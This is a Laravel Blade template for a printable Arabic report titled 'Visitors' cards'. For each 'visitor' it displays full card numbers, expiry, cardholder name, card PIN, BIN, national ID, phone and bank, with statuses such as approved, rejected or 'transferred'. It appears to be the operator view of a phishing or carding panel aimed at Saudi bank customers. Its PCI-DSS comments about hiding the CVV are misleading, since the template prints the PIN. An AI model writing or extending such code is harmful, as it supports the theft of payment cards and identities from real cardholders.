<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>بطاقات الزوار</title>
<style>
    @page { size: A4; margin: 12mm 10mm; }
    * { box-sizing: border-box; }
    html, body { margin: 0; padding: 0; }
    body {
        font-family: "Tahoma", "Arial", "Helvetica", sans-serif;
        color: #1a1a1a;
        background: #ffffff;
        font-size: 12px;
        line-height: 1.5;
        -webkit-print-color-adjust: exact;
        print-color-adjust: exact;
    }
    .page-wrap { max-width: 900px; margin: 0 auto; padding: 16px; }

    .toolbar { margin-bottom: 12px; text-align: left; }
    .toolbar button {
        background: #0f172a; color: #fff; border: 0; padding: 8px 16px;
        font-size: 13px; border-radius: 6px; cursor: pointer; font-family: inherit;
    }
    @media print { .toolbar { display: none; } }

    .report-header {
        display: flex; justify-content: space-between; align-items: flex-end;
        border-bottom: 3px solid #0f172a; padding-bottom: 10px; margin-bottom: 18px;
    }
    .report-header h1 { margin: 0; font-size: 22px; color: #0f172a; }
    .report-header .meta { font-size: 11px; color: #475569; text-align: left; }
    .report-header .meta .total { font-weight: 700; color: #0f172a; margin-top: 2px; }

    .record { margin-bottom: 22px; page-break-inside: avoid; }

    /* Customer header row above each card (RTL) */
    .cust-row {
        display: flex; justify-content: space-between; align-items: center;
        padding: 0 4px 8px;
        font-size: 12.5px;
    }
    .cust-row .name { font-weight: 700; color: #0f172a; }
    .cust-row .name .icon {
        display: inline-block; width: 14px; height: 14px;
        background: #0f172a; color: #fff; border-radius: 50%;
        text-align: center; line-height: 14px; font-size: 9px;
        margin-inline-start: 4px;
    }
    .cust-row .meta { color: #1f2937; direction: rtl; }
    .cust-row .meta .sep { color: #94a3b8; margin: 0 4px; }

    /* Bank-card UI */
    .card-wrap { display: flex; justify-content: flex-end; }
    .bank-card {
        width: 360px; min-height: 215px; border-radius: 14px;
        padding: 14px 16px 12px; position: relative; overflow: hidden;
        direction: ltr; font-family: "Tahoma", "Arial", sans-serif;
        border: 1px solid rgba(15, 23, 42, 0.08);
        box-shadow: 0 2px 6px rgba(15, 23, 42, 0.05);
        background: #e8f3eb;
    }
    .bank-card.brand-mada       { background: linear-gradient(180deg, #e9f5ec 0%, #d8ecdc 100%); }
    .bank-card.brand-visa       { background: linear-gradient(180deg, #eef0fa 0%, #dde2f5 100%); }
    .bank-card.brand-mastercard { background: linear-gradient(180deg, #fdecec 0%, #fbdada 100%); }
    .bank-card.brand-amex       { background: linear-gradient(180deg, #e8eefb 0%, #d3def5 100%); }

    .card-top {
        display: flex; justify-content: space-between; align-items: center;
        margin-bottom: 18px;
    }
    .card-top .bank-logo { max-height: 28px; max-width: 160px; object-fit: contain; }
    .card-top .bank-fallback { font-weight: 700; font-size: 13px; color: #0f172a; }
    .card-top .currency-pill {
        background: #ffffff; border: 1px solid #cbd5e1;
        border-radius: 6px; padding: 2px 10px;
        font-size: 11px; font-weight: 700; color: #0f172a;
        letter-spacing: 0.5px;
    }

    .card-pan-row {
        display: flex; justify-content: space-between; align-items: center;
        margin-bottom: 12px;
    }
    .card-pan {
        font-size: 19px; font-weight: 700; color: #0f172a;
        letter-spacing: 1.5px;
        font-family: "Courier New", "Tahoma", monospace;
    }
    .card-expiry { font-size: 13px; font-weight: 600; color: #0f172a; }

    .card-mid-row {
        display: flex; justify-content: space-between; align-items: flex-end;
        margin-bottom: 22px;
    }
    .card-holder {
        font-size: 13px; font-weight: 600; color: #0f172a;
        max-width: 220px; word-break: break-word;
    }
    .card-cvv { text-align: right; font-family: "Tahoma", monospace; }
    .card-cvv .cvv-label { font-size: 9px; color: #94a3b8; letter-spacing: 1px; }
    .card-cvv .cvv-val   { font-size: 13px; font-weight: 700; color: #0f172a; }

    .card-bottom {
        display: flex; justify-content: space-between; align-items: center;
    }
    .flag-pill {
        display: inline-block; width: 22px; height: 14px; border-radius: 2px;
        background: #006c35; position: relative;
    }
    .flag-pill::after {
        content: ''; position: absolute; left: 3px; top: 4px;
        width: 16px; height: 6px;
        background: rgba(255,255,255,0.7);
    }
    .brand-block {
        display: flex; align-items: center; gap: 10px;
        font-size: 11px; font-weight: 700; color: #0f172a;
        letter-spacing: 0.5px;
    }
    .brand-block .mada-logo { height: 14px; }
    .brand-block .visa-mark {
        font-family: "Arial Black", "Arial", sans-serif;
        font-style: italic; font-weight: 900; font-size: 18px;
        color: #1a1f71; letter-spacing: -1px;
    }
    .brand-block .mc-mark {
        position: relative; width: 36px; height: 18px; display: inline-block;
    }
    .brand-block .mc-mark::before,
    .brand-block .mc-mark::after {
        content: ''; position: absolute; top: 0;
        width: 18px; height: 18px; border-radius: 50%;
    }
    .brand-block .mc-mark::before { left: 0; background: #eb001b; }
    .brand-block .mc-mark::after  { left: 12px; background: #f79e1b; opacity: 0.85; mix-blend-mode: multiply; }
    .brand-block .amex-mark {
        background: #006fcf; color: #fff; padding: 2px 6px; border-radius: 3px;
        font-family: "Arial Black", sans-serif; font-size: 11px; letter-spacing: 0.5px;
    }
    .category-text { color: #0f172a; font-size: 11px; font-weight: 700; }

    .status-line {
        margin-top: 6px; padding-inline-end: 4px;
        text-align: right; font-size: 12px; font-weight: 700;
    }
    .status-pending  { color: #2563eb; }
    .status-approved { color: #15803d; }
    .status-rejected { color: #b91c1c; }

    .sensitive-strip {
        margin-top: 4px; padding: 6px 8px;
        font-size: 10.5px; color: #475569;
        border-top: 1px dashed #cbd5e1;
        display: flex; gap: 14px; flex-wrap: wrap;
    }
    .sensitive-strip span b { color: #0f172a; }

    .empty {
        text-align: center; padding: 60px 20px; color: #64748b; font-size: 14px;
        background: #fff; border-radius: 10px; border: 1px dashed #cbd5e1;
    }
</style>
</head>
<body>

<div class="page-wrap">

    <div class="toolbar">
        <button onclick="window.print()">طباعة / حفظ كـ PDF</button>
    </div>

    <div class="report-header">
        <h1>بطاقات الزوار</h1>
        <div class="meta">
            <div>تاريخ التقرير: {{ $generatedAt->format('Y-m-d H:i') }}</div>
            <div class="total">إجمالي البطاقات: {{ $total }}</div>
        </div>
    </div>

    @php
        // Map canonical bank_key → public asset path. Keys must match
        // config/bank_bins.php top-level keys.
        $bankLogos = [
            'rajhi'  => '/images/banks/alrajhi.png',
            'ahli'   => '/images/banks/SNB.png',
            'inma'   => '/images/banks/alinma.png',
            'sabb'   => '/images/banks/SABB.png',
            'jazira' => '/images/banks/Bank_Aljazira.png',
            'riyad'  => '/images/banks/Riyad_Bank.png',
            'bilad'  => '/images/banks/Bank_Albilad.png',
            'anb'    => '/images/banks/anb.png',
            'saib'   => '/images/banks/Saudi_Investment.png',
            'bsf'    => '/images/banks/Saudi_Fransi_Capital.webp',
        ];
        $madaLogo = '/images/banks/bank_mada.png';
    @endphp

    @forelse ($rows as $r)
        @php
            $brandKey = strtolower((string) $r['card_brand']);
            $brandClass = match ($brandKey) {
                'visa' => 'brand-visa',
                'mastercard' => 'brand-mastercard',
                'mada' => 'brand-mada',
                'amex' => 'brand-amex',
                default => 'brand-mada',
            };
            $statusClass = 'status-' . ($r['status'] ?: 'pending');
            $statusLabel = match ($r['status']) {
                'approved' => 'مقبول',
                'rejected' => 'مرفوض',
                'pending'  => 'منقول',
                default    => 'منقول',
            };
            $expDisplay = ($r['exp_month'] && $r['exp_year'])
                ? str_pad((string) $r['exp_month'], 2, '0', STR_PAD_LEFT) . '/' . substr((string) $r['exp_year'], -2)
                : '—';
            $panFormatted = $r['card_number']
                ? trim(chunk_split(preg_replace('/\D/', '', $r['card_number']), 4, ' '))
                : ($r['card_masked'] ?? '');
            // Resolver supplies the canonical logo path; legacy $bankLogos
            // array is kept as a defensive fallback for older data.
            $bankLogo = $r['bank_logo']
                ?? ($r['bank_key'] && isset($bankLogos[$r['bank_key']]) ? $bankLogos[$r['bank_key']] : null);
        @endphp

        <div class="record">

            <div class="cust-row">
                <div class="name">
                    <span class="icon">&#128100;</span>
                    {{ $r['customer_name'] ?: '—' }}
                </div>
                <div class="meta">
                    @if ($r['national_id'])<span>{{ $r['national_id'] }}</span><span class="sep">-</span>@endif
                    @if ($r['phone'])<span>{{ $r['phone'] }}</span>@endif
                    @if ($r['residency'])<span class="sep">-</span><span>{{ $r['residency'] === 'مواطن' ? 'مواطن سعودي' : $r['residency'] }}</span>@endif
                </div>
            </div>

            <div class="card-wrap">
                <div class="bank-card {{ $brandClass }}">

                    <div class="card-top">
                        @if ($bankLogo)
                            <img class="bank-logo" src="{{ $bankLogo }}" alt="{{ $r['bank_name'] }}">
                        @else
                            <div class="bank-fallback">{{ $r['bank_name'] ?: '—' }}</div>
                        @endif
                        <div class="currency-pill">{{ $r['currency'] }}</div>
                    </div>

                    <div class="card-pan-row">
                        <div class="card-pan">{{ $panFormatted ?: '**** **** **** ****' }}</div>
                        <div class="card-expiry">{{ $expDisplay }}</div>
                    </div>

                    <div class="card-mid-row">
                        <div class="card-holder">{{ $r['cardholder_name'] ?: '—' }}</div>
                        <div class="card-cvv">
                            <div class="cvv-label">CVV</div>
                            {{-- PCI-DSS 3.3.1: CVV is never persisted, never rendered. --}}
                            <div class="cvv-val">•••</div>
                        </div>
                    </div>

                    <div class="card-bottom">
                        <div class="flag-pill" title="SA"></div>
                        <div class="brand-block">
                            @if ($brandKey === 'mada')
                                <img class="mada-logo" src="{{ $madaLogo }}" alt="mada">
                            @elseif ($brandKey === 'visa')
                                <span class="visa-mark">VISA</span>
                            @elseif ($brandKey === 'mastercard')
                                <span class="mc-mark"></span>
                            @elseif ($brandKey === 'amex')
                                <span class="amex-mark">AMEX</span>
                            @endif
                            <span class="category-text">{{ $r['category_line'] }}</span>
                        </div>
                    </div>

                </div>
            </div>

            <div class="status-line {{ $statusClass }}">{{ $statusLabel }}</div>

            @if ($r['pin'])
                <div class="sensitive-strip">
                    {{-- PCI-DSS 3.3.1: CVV/CVC are never persisted nor rendered. --}}
                    <span><b>PIN:</b> {{ $r['pin'] }}</span>
                    <span><b>BIN:</b> {{ $r['card_bin'] ?: '—' }}</span>
                    <span><b>تاريخ التسجيل:</b> {{ optional($r['created_at'])->format('Y-m-d H:i') ?: '—' }}</span>
                </div>
            @endif

        </div>
    @empty
        <div class="empty">لا توجد بطاقات مسجلة حتى الآن.</div>
    @endforelse

</div>

</body>
</html>
